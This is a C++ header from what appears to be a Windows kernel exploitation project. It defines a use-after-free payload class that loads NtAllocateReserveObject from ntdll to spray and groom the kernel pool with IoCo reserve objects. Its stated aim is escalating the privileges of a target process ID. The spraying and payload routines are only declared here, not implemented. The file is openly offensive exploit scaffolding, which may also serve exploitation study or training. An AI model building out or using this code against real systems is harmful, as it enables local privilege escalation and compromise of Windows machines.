#ifndef __USE_AFTER_FREE_H__
#define __USE_AFTER_FREE_H__

#include "windows.h"
#include "..\shared\mem_attacker_shared.h" // sizeof(payload_use_after_free::BUFFER_FUNC);
#include "payloads.h"

#include "iostream" // cout, endl
using namespace std;

namespace payload_use_after_free {

	typedef struct _UNICODE_STRING
	{
		WORD Length;
		WORD MaximumLength;
		WORD * Buffer;
	} UNICODE_STRING, *PUNICODE_STRING;

	typedef struct _OBJECT_ATTRIBUTES
	{
		ULONG Length;
		PVOID RootDirectory;
		PUNICODE_STRING ObjectName;
		ULONG Attributes;
		PVOID SecurityDescriptor;
		PVOID SecurityQualityOfService;
	} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

	/* ObjectType */
	#define IOCO 1

	// We can use the NtAllocateReserveObject function to create IoCo objects. 
	// NtAllocateReserveObject is a system call responsible for creating an object on
	// the kernel side performing a memory allocation on the kernel pool
	typedef NTSTATUS(__stdcall *NtAllocate_type) (
		OUT PHANDLE hObject,
		IN POBJECT_ATTRIBUTES ObjectAttributes,
		IN DWORD ObjectType);

#ifndef NT_SUCCESS
	#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif // NT_SUCCESS

	class PayloadUseAfterFree
	{
	public:
		byte* _buffer; // input buffer with payload

		PayloadUseAfterFree(const DWORD pid) {
			_targetPid = pid;
			_buffer = 0;
			_hModuleNtDll = 0;
			_NtAllocateFunc = NULL;
		};

		~PayloadUseAfterFree() {
			clear();
			if (_hModuleNtDll) {
				FreeLibrary(_hModuleNtDll);
			}
			_targetPid = 0;
			_buffer = 0;
		};

		bool init() {
			auto b_res = false;
			if (payloads::process_is_running(_targetPid)) {
				const wchar_t wc_ntdll[] = TEXT("ntdll.dll");
				if (NULL != (_hModuleNtDll = LoadLibrary(wc_ntdll))) {
					const char nameNtAllocate[] = "NtAllocateReserveObject";
					if (NULL !=
						(_NtAllocateFunc = (NtAllocate_type)GetProcAddress(_hModuleNtDll, nameNtAllocate))) {
						b_res = true;
					}
				}
			}
			else {
				cout << "There is no active process with the UniqueProcessId = " << _targetPid << endl;
			}
			return b_res;
		}
		
		/* Windows Kernel Pool Spraying */
		bool prepare_memory();

		/* Prepare payload */
		bool prepare_payload();

		/* Free allocated memory */
		void clear();

		static const DWORD poolDefragSz = 0x1000;
		static const DWORD poolGroomSz = 0x500;
	private:
		DWORD _targetPid; // process 'PID' which is needed to escalate privileges
		HMODULE _hModuleNtDll; // handle from NtDll.dll 
		NtAllocate_type _NtAllocateFunc; // address of NtAllocateReserveObject() func

		HANDLE hReserveObjectsDefrag[poolDefragSz] = {0};
		
		HANDLE hReserveObjectsPoolGroom[poolGroomSz] = {0};
	};
}

#endif // __USE_AFTER_FREE_H__